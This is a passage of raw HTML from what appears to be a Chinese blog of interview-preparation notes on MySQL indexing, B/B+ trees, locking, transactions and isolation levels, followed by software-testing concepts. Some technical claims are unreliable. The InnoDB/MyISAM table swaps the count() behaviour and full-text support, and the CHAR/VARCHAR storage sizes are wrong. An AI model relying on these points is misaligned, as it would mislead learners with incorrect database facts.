class="keyword">LIKE</span> <span class="string">&#x27;%码农%&#x27;</span> <span class="comment">-- 走索引</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;manong&#x27;</span> <span class="keyword">WHERE</span> <span class="string">&#x27;uname&#x27;</span> <span class="keyword">LIKE</span> &quot;%码农%&quot; <span class="comment">-- 不走索引</span></span><br></pre></td></tr></table></figure><p>4、字符串与数字比较不走索引：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">&#x27;a&#x27;</span> (<span class="string">&#x27;a&#x27;</span> <span class="type">char</span>(<span class="number">10</span>));</span><br><span class="line">EXPLAIN <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">WHERE</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> &quot;1&quot;; <span class="comment">-- 走索引</span></span><br><span class="line">EXPLAIN <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">WHERE</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="number">1</span>;   <span class="comment">-- 不走索引，同样也是使用了函数运算</span></span><br></pre></td></tr></table></figure><p>5、查询条件中有or，即时其中有条件带索引也不会使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> dept <span class="keyword">WHERE</span> dname<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span> <span class="keyword">or</span> loc<span class="operator">=</span><span class="string">&#x27;xx&#x27;</span> <span class="keyword">or</span> deptno<span class="operator">=</span><span class="number">45</span>;</span><br></pre></td></tr></table></figure><p>6、正则表达式不使用索引</p><p>7、MySQL内部优化器会对SQL语句进行优化，如果优化器估算使用全表扫描比使用索引快，则不使用索引。</p><h3 id="13-索引的底层使用的是什么数据结构？"><a href="#13-索引的底层使用的是什么数据结构？" class="headerlink" title="13 - 索引的底层使用的是什么数据结构？"></a>13 - 索引的底层使用的是什么数据结构？</h3><p>索引的数据结构和具体存储引擎的实现有关，常用的有Hash索引，B+树索引等</p><p>InnoDB存储引擎默认索引实现为 B+树索引</p><h3 id="14-谈谈你对B-树的理解？"><a href="#14-谈谈你对B-树的理解？" class="headerlink" title="14 - 谈谈你对B+树的理解？"></a>14 - 谈谈你对B+树的理解？</h3><ul><li>B+树是基于B树和叶子节点顺序访问指针进行实现的，它具有B树的平衡性，并且通过顺序访问指针来提高查询的性能。</li><li>B+树中，节点中的key从左到右非递减排列，如果某个指针的左右相邻key_i 和 key_i+1，且不为NULL，则该指针指向节点的所有key大于等于key_i且小于等于key_i+1</li><li>进行查找操作时，首先在根节点进行二分查找，找到一个key所在的指针，然后递归地在指针所指向的节点进行查找，直到查找到叶子节点，然后在叶子节点上进行二分查找，找出key所定义的data</li><li>插入、删除操作会破坏平衡树的平衡性，因此在插入删除操作后、需要对树进行一个分裂、合并、旋转等操作来维护平衡性。</li></ul><h3 id="15-InnoDB存储引擎选用B-树而不是B树的原因？"><a href="#15-InnoDB存储引擎选用B-树而不是B树的原因？" class="headerlink" title="15 - InnoDB存储引擎选用B+树而不是B树的原因？"></a>15 - InnoDB存储引擎选用B+树而不是B树的原因？</h3><p>用B+树不用B树考虑的是 IO 对性能的影响，B树的每个节点都存储数据，而B+树只有叶子节点才存储数据，所以查找相同数据量的情况下，B树的高度更高，IO更频繁。</p><p>数据库索引是存储在磁盘上的，当数据量过大时，就不能把整个索引uqanbu加载到内存了，只能逐一加载每一个磁盘页（对应索引树的节点）</p><h3 id="16-InnoDB-和-MyISAM的比较？"><a href="#16-InnoDB-和-MyISAM的比较？" class="headerlink" title="16 - InnoDB 和 MyISAM的比较？"></a>16 - InnoDB 和 MyISAM的比较？</h3><table><thead><tr><th align="center"></th><th align="center">InnoDB</th><th align="center">MyISAM</th></tr></thead><tbody><tr><td align="center">事务</td><td align="center">支持</td><td align="center">不支持</td></tr><tr><td align="center">全文索引</td><td align="center">不支持</td><td align="center">支持</td></tr><tr><td align="center">数据量过大时使用count()</td><td align="center">瞬间返回，因为MyISAM会直接存储总行数</td><td align="center">需要按行扫描再返回结果</td></tr><tr><td align="center">外键</td><td align="center">支持</td><td align="center">不支持</td></tr><tr><td align="center">锁</td><td align="center">支持表锁、行锁，默认行锁</td><td align="center">只支持表锁</td></tr></tbody></table><h3 id="17-说一下MySQL的行锁和表锁？"><a href="#17-说一下MySQL的行锁和表锁？" class="headerlink" title="17 - 说一下MySQL的行锁和表锁？"></a>17 - 说一下MySQL的行锁和表锁？</h3><p>MyISAM只支持表锁，InnoDB支持表锁和行锁，默认为行锁。</p><p>表锁：开销小，加锁快，不会出现死锁。锁定力度大，发生锁冲突的概率高，并发度低</p><p>行锁：开销大，加锁慢，会出现死锁。锁力度小，发生锁冲突的概率低，并发度最高</p><h3 id="18-描述下事务的特性？"><a href="#18-描述下事务的特性？" class="headerlink" title="18 - 描述下事务的特性？"></a>18 - 描述下事务的特性？</h3><ul><li>原子性：事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用</li><li>一致性：执行事务前后，数据从一个一致性状态转换到另一个一致性状态</li><li>隔离性：并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的</li><li>持久性：一个事务被提交后。它对数据库中数据的改变是持久的，即时数据库发生故障也不应该对其有任何影响</li></ul><h3 id="19-什么叫脏读、不可重复读和幻读？"><a href="#19-什么叫脏读、不可重复读和幻读？" class="headerlink" title="19 - 什么叫脏读、不可重复读和幻读？"></a>19 - 什么叫脏读、不可重复读和幻读？</h3><ul><li>脏读：表示一个事务能够读取另一个事务中还未提交的数据。<ul><li>比如：某个事物尝试插入记录A，此时该事务还未提交，然而另一个事务尝试读取到了这个记录A</li></ul></li><li>不可重复读：是指一个事务内，多次读取一个数据</li><li>幻读：指一个事务内多次查询返回的结果集不一样。<ul><li>比如：同一个事务A第一次查询的时候有n个记录，但是第二次同等条件下查询却有n+1条记录。</li><li>原因：发生幻读的原因也是另外一个事务新增或删除或修改了第一个事务的结果集里的数据，同一个记录的数据内容被修改了，所有数据行的记录就变多或变少了。</li></ul></li></ul><h3 id="20-谈谈你对事务隔离级别的理解？"><a href="#20-谈谈你对事务隔离级别的理解？" class="headerlink" title="20 - 谈谈你对事务隔离级别的理解？"></a>20 - 谈谈你对事务隔离级别的理解？</h3><p><strong>1、READ_UNCOMMITTED（未提交读）：</strong>最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读、不可重复读</p><p><strong>2、READ_COMMITTED（提交读）：</strong>允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读、不可重复读仍有可能发生</p><p><strong>3、REPEATABLE_READ（可重复读）：</strong>对同一字段的多次读取结果都是一致的，除非数据是被本事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。</p><p><strong>4、SERIALIZABLE（串行化）：</strong>最高隔离级别，完全服从ACID的隔离级别。所有的事务依次执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以阻止脏读、不可重读读、幻读。但是这将严重影响程序的性能，通常情况都不会使用该级别。</p><p><strong>ACID，</strong>是指数据库管理系统（DBMS）在写入或更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性：原子性（atomicity，或称不可分割性）、一致性（consistency）、隔离性（isolation，又称独立性）、持久性（durability）。</p><h3 id="21-主从复制是什么？主从复制中涉及到哪三个线程？"><a href="#21-主从复制是什么？主从复制中涉及到哪三个线程？" class="headerlink" title="21 - 主从复制是什么？主从复制中涉及到哪三个线程？"></a>21 - 主从复制是什么？主从复制中涉及到哪三个线程？</h3><h4 id="主从复制是什么？"><a href="#主从复制是什么？" class="headerlink" title="主从复制是什么？"></a>主从复制是什么？</h4><p>主从复制是用来建立一个和主数据库完全一样的数据库环境，称为从数据库；主数据库一般是实时的业务数据库，从数据库的作用和使用场合一般有几个：</p><ul><li>一是作为后备数据库，主数据库服务器故障后，可切换到从数据库继续工作；</li><li>二是可在从数据库作备份、数据统计等工作，这样不影响主数据库的性能；</li></ul><h4 id="主从复制中涉及到哪三个线程？"><a href="#主从复制中涉及到哪三个线程？" class="headerlink" title="主从复制中涉及到哪三个线程？"></a>主从复制中涉及到哪三个线程？</h4><ul><li>binlog线程：负责将主服务器上的数据更改写入二进制日志（Binary log）中</li><li>I&#x2F;O线程：负责从主服务器上读取二进制日志，并写入从服务器的重放日志（Relay log）中</li><li>SQL线程：负责读取重放日志并重放其中的SQL数据</li></ul><h3 id="22-谈谈你对数据库读写分离的理解？"><a href="#22-谈谈你对数据库读写分离的理解？" class="headerlink" title="22 - 谈谈你对数据库读写分离的理解？"></a>22 - 谈谈你对数据库读写分离的理解？</h3><p>读写分离常用代理方式实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。</p><p>读写分离能提高性能，是因为：</p><ul><li>主从服务器负责各自的读和写，极大程度缓解了锁的争用</li><li>从服务器可以使用MyISAM，提高查询性能以及节约系统开销</li><li>增加冗余，提高可用性</li></ul><h3 id="23-MySQL默认的隔离级别是什么？"><a href="#23-MySQL默认的隔离级别是什么？" class="headerlink" title="23 - MySQL默认的隔离级别是什么？"></a>23 - MySQL默认的隔离级别是什么？</h3><p>MySQL：REPEATABLE_READ （repeatable_read）</p><p>ORACLE：READ_COMMITTED （read_committed）</p><h3 id="24-InnoDB-存储引擎的锁算法有哪些？"><a href="#24-InnoDB-存储引擎的锁算法有哪些？" class="headerlink" title="24 - InnoDB 存储引擎的锁算法有哪些？"></a>24 - InnoDB 存储引擎的锁算法有哪些？</h3><ul><li>Record Lock：单个行记录上的锁</li><li>Gap Lock：间隙锁，锁定一个范围，不包括记录本身</li><li>Next_key Lock： Record + Gap 锁定一个范围，包括记录本身</li></ul><h3 id="25-MySQL问题排查都有哪些手段？"><a href="#25-MySQL问题排查都有哪些手段？" class="headerlink" title="25 - MySQL问题排查都有哪些手段？"></a>25 - MySQL问题排查都有哪些手段？</h3><ol><li>使用 show processlist 命令查看当前所有连接信息</li><li>使用 Explain 命令查询SQL语句执行计划</li><li>开启慢查询日志，查看慢查询的SQL</li></ol><h3 id="26-MySQL中CHAR和VARCHAR的区别？"><a href="#26-MySQL中CHAR和VARCHAR的区别？" class="headerlink" title="26 - MySQL中CHAR和VARCHAR的区别？"></a>26 - MySQL中CHAR和VARCHAR的区别？</h3><ul><li>char的长度是不可变的，用空格填充到指定长度大小，而varchar的长度是可变的。</li><li>char的存取速度还是要比varchar要快得多</li><li>char的存储方式是：对英文字符（ASCII）占用1个字节，对一个汉字占用两个字节。varchar的存储方式是：对每个英文字符占用2个字节，汉字也占用2个字节。</li></ul><h3 id="27-谈谈你对水平切分和垂直切分的理解？"><a href="#27-谈谈你对水平切分和垂直切分的理解？" class="headerlink" title="27 - 谈谈你对水平切分和垂直切分的理解？"></a>27 - 谈谈你对水平切分和垂直切分的理解？</h3><ul><li><p>水平切分</p><ul><li>水平切分是将同一个表中的记录拆分到多个结构相同的表中。当一个表的数据不断增多时，水平切分是必然的选择，它可以将数据分布到集群的不同节点上，从而缓解单个数据库的压力</li></ul></li><li><p>垂直切分</p><ul><li>垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。例如：将原来的电商数据库垂直切分成商品数据库、用户数据库等。</li></ul></li></ul><h3 id="28-存储过程的优缺点？"><a href="#28-存储过程的优缺点？" class="headerlink" title="28 - 存储过程的优缺点？"></a>28 - 存储过程的优缺点？</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p><strong>1、重复使用。存储过程可以重复使用，从而可以减少数据库开发人员的工作量。</strong></p><p><strong>2、减少网络流量。存储过程位于服务器上，调用的时候只需要传递存储过程的名称以及参数就可以了，因此降低了网络传输的数据量。</strong></p><p><strong>3、安全性。参数化的存储过程可以防止SQL注入式攻击，</strong>而且可以将Grant、Deny以及Revoke权限应用于存储过程。</p><p>简单讲：</p><p>1.存储过程只在创造时进行编译，以后每次执行存储过程都不需再重新编译，而一般SQL语句每执行一次就编译一次,所以使用存储过程可提高数据库执行速度。</p><p>2.当对数据库进行复杂操作时(如对多个表进行Update,Insert,Query,Delete时)，可将此复杂操作用存储过程封装起来与数据库提供的事务处理结合一起使用。</p><p>3.存储过程可以重复使用,可减少数据库开发人员的工作量</p><p>4.安全性高,可设定只有某些用户才具有对指定存储过程的使用权</p><p>有一点需要注意的是，一些网上盛传的所谓的存储过程要比sql语句执行更快的说法，实际上是个误解，并没有根据，包括微软内部的人也不认可这一点，所以不能作为正式的优点，希望大家能够认识到这一点。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p><strong>1、调试麻烦，</strong>但是用 PL&#x2F;SQL Developer 调试很方便！弥补这个缺点。</p><p><strong>2、移植问题，</strong>数据库端代码当然是与数据库相关的。但是如果是做工程型项目，基本不存在移植问题。</p><p><strong>3、重新编译问题，</strong>因为后端代码是运行前编译的，如果带有引用关系的对象发生改变时，受影响的存储过程、包将需要重新编译（不过也可以设置成运行时刻自动编译）。</p><p><strong>4、 如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难、而且代价是空前的，维护起来更麻烦。</strong></p><h3 id="29-给定a、b两个文件，各存放50亿个url，每个url占64字节，内存限制4gb，找出a、b文件共同的url"><a href="#29-给定a、b两个文件，各存放50亿个url，每个url占64字节，内存限制4gb，找出a、b文件共同的url" class="headerlink" title="29 - 给定a、b两个文件，各存放50亿个url，每个url占64字节，内存限制4gb，找出a、b文件共同的url"></a>29 - 给定a、b两个文件，各存放50亿个url，每个url占64字节，内存限制4gb，找出a、b文件共同的url</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>先计算总数据，看看能不能一次性放到内存里：</p><p>50亿 &#x3D; 5,000,000,000 约等于5G</p><p>总大小：5G * 64B &#x3D; 32GB ，远大于4GB</p><p><strong>只能使用哈希表将文件切分成小文件</strong>：</p><p>文件的数量怎么确定？切成小文件后，内存里需要同时 存放a和b的两个小文件，才能进行比较。那一个小文件的最大大小为2G，32&#x2F;2 &#x3D; 16，但是机器运行还需要内存，所以切分成20份，两个小文件占用内存3.2G，一个1.6GB</p><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p><strong>（1）对a 、b、hash(url)%20,分为20个小文件里</strong></p><p>hash映射函数可以有多种选择</p><p>最简单的就是按首字母分类，分成26个喜爱哦文件，但是不能保证每个文件大小相等，也不符合20个小文件的设定</p><p><strong>可以取前4个字节的int和%20，分配到20个小文件里</strong></p><p><strong>（2）因为使用同一个hash函数映射规则的原因，a，b切分后相同的URL存在对应的小文件里，即a0只需要和b0不急，a1和b1比较即可</strong></p><p><strong>（3）同时加载每一对小文件（如a0和b0），如果有相同的URL，则输出到文件中记录，全部比较完成后，文件中就是所有相同的记录</strong></p><h3 id="30-B树"><a href="#30-B树" class="headerlink" title="30 - B树"></a>30 - B树</h3><p><img src="/2022/08/26/%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/image-20210918093128242.png" alt="image-20210918093128242"></p><p><strong>B树（B-树）是一种平衡多路查找数，B树中所有节点的子树个数的最大值称为B树的阶，用m表示，一颗m阶的B树，如果不为空，必须满足以下特性：</strong></p><ul><li>树中每个节点至多有m-1个关键字，有m颗子树（叶结点也算B树的子树）</li><li>除根节点以外，所以非叶节点至少含有 $\lceil m&#x2F;2 \rceil  - 1$个关键字，即 $\lceil m&#x2F;2 \rceil $ 颗子树。（根节点的关键字可以小于$\lceil m&#x2F;2 \rceil -1$，可以没有子树，如果有子树，则至少有两颗）</li><li>所有叶节点都在同一层上（各个子树没有高度差，绝对平衡）。叶结点不带信息，可以看成查找失败的节点</li><li>所有非叶子节点的结构为下图：<ul><li>其中 $K_i(i &#x3D; 1,2,3,…,n)$ 为节点的关键字，且满足 $K_1&lt;K_2&lt;K_3&lt;..&lt;K_n$，$P_i(i&#x3D;0,1,2,3…,n)$ 为指向子树根节点的指针</li></ul></li></ul><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210918094430405.png" alt="image-20210918094430405"></p><p>一颗含有n个关键字的m阶B树（最小高度和最大高度不包括叶结点）：</p><ul><li>有多少个叶节点？<ul><li>n+1</li></ul></li><li>最小高度是多少？<ul><li>最胖的树最矮，让每个节点有m-1个关键字，即 $h\ge \log_m{(n+1)}$</li></ul></li><li>最大高度是多少？<ul><li>最瘦的树最高，让树中每个节点有 $\lceil m&#x2F;2 \rceil  - 1$个关键字 ，根节点只有一个关键字即可</li><li>$h \le \log_k{\frac{n+1}{2}} +1 &#x3D; \log_{\lceil m&#x2F;2 \rceil}{\frac{n+1}{2}}+1$</li></ul></li></ul><h3 id="31-B-树"><a href="#31-B-树" class="headerlink" title="31 - B+树"></a>31 - B+树</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210918112230660.png" alt="image-20210918112230660"></p><p>在B+树中查找某个关键字，可以从根节点开始，采用分块查找的方法，也可以直接从叶节点开始，采用顺序查找的方法</p><p>B+树中，上面存放索引的叫分支节点，最后一层叶结点是存放数据的</p><p><strong>定义：</strong></p><p>一颗m阶的B+树，如果不为空，就必须满足以下特性：</p><ul><li>树中的每个节点至多有m个关键字，即m颗子树。（结点的关键字个数与子树数量相同）</li><li>除根节点外，所有非节点至少含有$\lceil m&#x2F;2 \rceil$个关键字，即$\lceil m&#x2F;2 \rceil$颗子树。（根节点关键字的个数可以小于$\lceil m&#x2F;2 \rceil$，可以没有子树，如果有子树，则至少有两颗）。</li><li>所有叶节点包含了全部关键字和关键字指向记录的指针，叶节点内的关键字有序排列，叶结点之间也是有序排列，指针相连</li><li>所有非终端节点可以看成索引，仅包含了其子树中最大或最小关键字的值</li></ul><h3 id="32-B树与B-树的差异"><a href="#32-B树与B-树的差异" class="headerlink" title="32 - B树与B+树的差异"></a>32 - B树与B+树的差异</h3><p>m阶的B树和B+树的差异（以5阶为例）：</p><p>（1）B+树由分块查找进化而来；B树由二叉排序树进来而来</p><p>（2）在B+树中，每个非根节点关键字的取值范围是 $3 \le n \le 5$，有n颗子树；在B树中，每个非根节点的取值范围是$2 \le n \le 4$，有n+1颗子树</p><p>（3）在B+树中，仅叶子节点包含信息，非叶子节点仅起索引作用；在B树中，全部节点的关键字都包含信息。</p><p>（4）在B+树中，叶结点包含了全部的关键字，非叶节点中出现的关键字一定会出现在叶子结点中；在B树中，任何节点的关键字都不会重复。</p><p>（5）B+树支持顺序查找和多路查找；B树只支持多路查找</p><h3 id="33-Drop、Delete、Truncate的区别"><a href="#33-Drop、Delete、Truncate的区别" class="headerlink" title="33 - Drop、Delete、Truncate的区别"></a>33 - Drop、Delete、Truncate的区别</h3><ul><li>Delete 用来删除表的全部或者一部分数据行，执行Delete之后，用户需要提交(commmit)或者回滚(rollback)来执行删除或者撤销删除，会触发这个表上所有的delete触发器。</li><li>Truncate删除表中的所有数据，这个操作不能回滚，也不会触发这个表上的触发器，Truncate比Delete更快，占用的空间更小。</li><li>Drop命令从数据库中删除表，所有的数据行，索引和权限也会被删除，所有的DML触发器也不会被触发，这个命令也不能回滚。</li></ul><p>在不再需要一张表的时候，用Drop；在想删除部分数据行时候，用Delete；在保留表而删除所有数据的时候用Truncate。</p><h3 id="34-悲观锁和乐观锁的原理以及应用场景？"><a href="#34-悲观锁和乐观锁的原理以及应用场景？" class="headerlink" title="34 - 悲观锁和乐观锁的原理以及应用场景？"></a>34 - 悲观锁和乐观锁的原理以及应用场景？</h3><h4 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h4><ul><li><strong>先获取锁，再进行业务操作</strong>，一般就是利用类似 SELECT … FOR UPDATE 这样的语句，对数据加锁，避免其他事务意外修改数据。</li><li>当数据库执行SELECT … FOR UPDATE时会获取被SELECT中的数据行的行锁，SELECT FOR UPDATE获取的行锁会在当前事务结束时自动释放，因此必须在事务中使用。</li></ul><h4 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h4><ul><li><p><strong>先进行业务操作，只在最后实际更新数据时检查数据是否被更新过</strong> </p></li><li><p>Java 并发包中的AtomicFieldUpdater 类似，也是利用 CAS 机制，并不会对数据加锁，而是通过对比数据的时间戳或者版本号，来实现乐观锁需要的版本判断。</p></li></ul><h2 id="六、Redis"><a href="#六、Redis" class="headerlink" title="六、Redis"></a>六、Redis</h2><h2 id="七、测试"><a href="#七、测试" class="headerlink" title="七、测试"></a>七、测试</h2><h3 id="1-软件开发需要哪些知识？需要具备什么能力？"><a href="#1-软件开发需要哪些知识？需要具备什么能力？" class="headerlink" title="1 - 软件开发需要哪些知识？需要具备什么能力？"></a>1 - 软件开发需要哪些知识？需要具备什么能力？</h3><ul><li><p>首先肯定需要软件测试的基础理论知识，如黑盒测试、白盒测试等，熟悉软件开发的整个生命周期，以及伴随着这个开发流程的各个测试环节</p></li><li><p>还要有全面的计算机知识：</p></li><li><p>编程语言：C、C++、java，还要掌握一门python、lua、shell脚本语言用于自动化测试</p></li><li><p>计算机的基础知识，如操作系统、Linux、计算机网络、数据库等</p></li><li><p>会使用自动化测试工具：</p><ul><li>如Selenium（Web自动化测试工具），</li><li>Appium（移动端自动化测试开源工具 ），‘</li><li>Jmeter（Web应用程序的负载测试，可以进行接口测试，性能测试）</li><li>Monkey（稳定性测试）</li><li>LoadRunner（性能测试，是一种预测系统行为和性能的负载测试工具。通过以模拟上千万用户实施并发负载及实时性能监测的方式来确认和查找问题）</li></ul></li><li><p>单元测试框架，如Junit、Pytest</p></li></ul><p><strong>需要具备的能力：</strong></p><ul><li><p>善于分析，而且要有一定的洞察力：通过分析代码的业务流程和逻辑，能发现其中隐藏的问题，问题发现的越早，解决的成本越低，这样问题越有价值。</p></li><li><p>还要有专业技术能力，就是刚刚所说的那些具备的知识，（测试基础知识、计算机知识、熟练运用测试工具）没有这些，发现问题就无从谈起，专业的技术能力是能让测试者分析问题发现问题的基础、基石。而且没有过硬的专业技术能力，再跟开发人员进行沟通的时候，可能连自己都说不清，也会不硬气，只有懂得深，自己明白问题的前因后果，才能跟别人解释清楚。</p></li><li><p>逻辑思考能力：软件开发中会有很多可行性逻辑分析，代码中也会有很多逻辑的判断，逻辑思考能力强也是能尽早发现问题的关键</p></li><li><p>沟通表达能力和团队协作能力：在发现问题后要能和开发人员、产品人员以及上下级进行有效的沟通，专业技术能力也是沟通表达能力的基石，只有自己深刻理解问题才能说的出来，说的清楚。软件的测试和开发通常是按照W模型的方法进行结合，测试和开发同步进行，这就需要团队的高效协作，从而实现项目的快速推进。</p></li></ul><h3 id="2-软件测试的核心竞争力是什么？"><a href="#2-软件测试的核心竞争力是什么？" class="headerlink" title="2 - 软件测试的核心竞争力是什么？"></a>2 - 软件测试的核心竞争力是什么？</h3><p>测试人员的核心竞争力在于提早发现问题，并能够发现别人无法发现的问题。</p><ul><li>早发现问题：问题发现的越早，解决的成本越低。如果一个需求在还未实现的时候就能发现需求的漏洞，那么这种问题的价值是最高的。</li><li>发现别人无法发现的问题：所有人都能发现的问题，你发现了，那就证明你是可以被替代的。别人发现不了，而你可以发现，那么你就是无法被替代。</li></ul><h3 id="3-测试和开发需要怎么结合才能使软件的质量得到更好的保障？"><a href="#3-测试和开发需要怎么结合才能使软件的质量得到更好的保障？" class="headerlink" title="3 - 测试和开发需要怎么结合才能使软件的质量得到更好的保障？"></a>3 - 测试和开发需要怎么结合才能使软件的质量得到更好的保障？</h3><p>测试和开发应该按照W模型的方式进行结合，测试和开发同步进行，能够尽早发现软件缺陷，降低软件开发的成本。</p><p>W 模型强调：测试伴随着整个软件开发周期，而且测试的对象不仅仅是程序，需求、设计等同样要测试，也就是说，测试与开发是同步进行的。有利于尽早地全面的发现问题。</p><p>例如，需求分析完成后，测试人员就应该参与到对需求的验证和确认活动中，以尽早地找出缺陷所在。同时，对需求的测试也有利于及时了解项目难度和测试风险，及早制定应对措施，这将显著减少总体测试时间，加快项目进度。</p><p>W 模型中测试的活动与软件开发同步进行，测试的对象不仅仅是程序，还包括需求和设计，<br>因此能够尽早发现软件缺陷，降低软件开发的成本。</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210919160630915.png" alt="image-20210919160630915"></p><h3 id="4-单元测试、集成测试、系统测试、验收测试、回归测试"><a href="#4-单元测试、集成测试、系统测试、验收测试、回归测试" class="headerlink" title="4 - 单元测试、集成测试、系统测试、验收测试、回归测试"></a>4 - 单元测试、集成测试、系统测试、验收测试、回归测试</h3><p>（1）单元测试：完成最小的软件设计单元（模块）的验证工作，目标是确保模块被正确的编码通常情况下是白盒的，对代码风格和规则、程序设计和结构、业务逻辑等进行静态测试，及早的发现和解决不易显现的错误。</p><p>（2）集成测试：通过测试发现与模块接口有关的问题。目标是把通过了单元测试的模块拿来，构造一个在设计中所描述的程序结构，应当避免一次性的集成（除非软件规模很小），而采用增量集成。</p><p>自顶向下集成：模块集成的顺序是首先集成主模块，然后按照控制层次结构向下进行集成，</p><p>自底向上集成：从原子模块开始来进行构造和测试，</p><p>（3）系统测试：是基于系统整体需求说明书的黑盒类测试，要覆盖系统所有联合的部件。目的是验证系统是否满足了需求规格的定义，找出与需求规格不相符合或与之矛盾的地方。而且是在系统实际运行环境下来进行测试。</p><p>（4）回归测试：回归测试是指在发生修改之后重新测试先前的测试用例以保证修改的正确性。理论上，软件产生新版本，都需要进行回归测试，根据修复好了的缺陷再重新进行测试。回归测试的目的在于验证以前出现过但已经修复好的缺陷不再重新出现。</p><p>（5）验收测试：验收测试是指系统开发生命周期方法论的一个阶段，这时相关的用户或独立测试人员根据测试计划和结果对系统进行测试和接收。它让系统用户决定是否接收系统。它是一项确定产品是否能够满足合同或用户所规定需求的测试。</p><p>验收测试包括Alpha 测试和Beta 测试：</p><ul><li>Alpha 测试：是由用户在开发者的场所来进行的，在一个受控的环境中进行。</li><li>Beta 测试：由软件的最终用户在一个或多个用户场所来进行的，开发者通常不在现场，用户记录测试中遇到的问题并报告给开发者，开发者对系统进行最后的修改，并开始准备发布最终的软件。</li></ul><h3 id="5-单元测试、集成测试、系统测试、验收测试、回归测试这几步中最重要的是哪一步？"><a href="#5-单元测试、集成测试、系统测试、验收测试、回归测试这几步中最重要的是哪一步？" class="headerlink" title="5 - 单元测试、集成测试、系统测试、验收测试、回归测试这几步中最重要的是哪一步？"></a>5 - 单元测试、集成测试、系统测试、验收测试、回归测试这几步中最重要的是哪一步？</h3><p>​这些测试步骤是分别在软件开发的不同阶段对软件进行测试的，</p><p>​我认为最重要的是系统测试，它主要是验证软件的功能是否，而且此时单元测试和集成测试已完成，能够对软件所有功能进行功能测试，覆盖系统所有的联合部件，是针对整个产品系统进行的测试，能够验证系统是否满足了需求，因此我认为系统测试很重要。</p><h3 id="6-请说一说黑盒与白盒的测试方法"><a href="#6-请说一说黑盒与白盒的测试方法" class="headerlink" title="6 - 请说一说黑盒与白盒的测试方法"></a>6 - 请说一说黑盒与白盒的测试方法</h3><h4 id="黑盒测试概念："><a href="#黑盒测试概念：" class="headerlink" title="黑盒测试概念："></a>黑盒测试概念：</h4><ul><li><p>黑盒测试也称功能测试或数据驱动测试</p></li><li><p><strong>它是在已知道软件有什么功能的情况下，通过测试来检测每个功能是否都能正常使用</strong></p></li><li><p>在测试时，把程序看作一个不能打开的黑盆子，在完全不考虑程序内部结构和内部特性的情况下，测试者在程序接口进行测试，</p></li><li><p>黑盒测试只检查程序功能是否按照需求规格说明书的规定正常使用，程序是否能适当地接收输入数锯而产生正确的输出信息，并且保持外部信息（如数据库或文件）的完整性。</p></li></ul><h4 id="黑盒测试测试方法："><a href="#黑盒测试测试方法：" class="headerlink" title="黑盒测试测试方法："></a>黑盒测试测试方法：</h4><p>“黑盒”法是穷举输入测试，只有把所有可能的输入都作为测试情况使用，才能以这种方法查出程序中所有的错误。实际上测试情况有无穷多个，因此不仅要测试所有合法的输入，而且还要对那些不合法但是可能的输入进行测试。</p><p>常用的黑盒测试方法有：等价类划分法；边界值分析法；因果图法；场景法；正交实验设计法；判定表驱动分析法；错误推测法；功能图分析法。</p><h4 id="白盒测试概念："><a href="#白盒测试概念：" class="headerlink" title="白盒测试概念："></a>白盒测试概念：</h4><ul><li><p>白盒测试也称为结构测试或逻辑驱动测试，是针对被测单元内部是如何进行工作的测试。</p></li><li><p>白盒测试根据程序的控制结构设计测试用例，检查程序内部逻辑结构，对所有的逻辑路径进行测试，是一种穷举路径的测试方法，但即使每条路径都测试过了，但仍然有可能存在错误。</p><ul><li>因为穷举路径测试无法检查出程序本身是否违反了设计规范，即程序是否是一个错误的程序；穷举路径测试不可能检查出程序因为遗漏路径而出错；穷举路径测试发现不了一些与数据相关的错误。</li></ul></li><li><p>白盒测试需要遵循的原则有： </p><ol><li>保证一个模块中的所有独立路径至少被测试一次；</li><li>所有逻辑值均需要测试真（true）和假（false）两种情况；</li><li>检查程序的内部数据结构，保证其结构的有效性；</li><li>在上下边界及可操作范围内运行所有循环。</li></ol></li></ul><h4 id="白盒测试方法："><a href="#白盒测试方法：" class="headerlink" 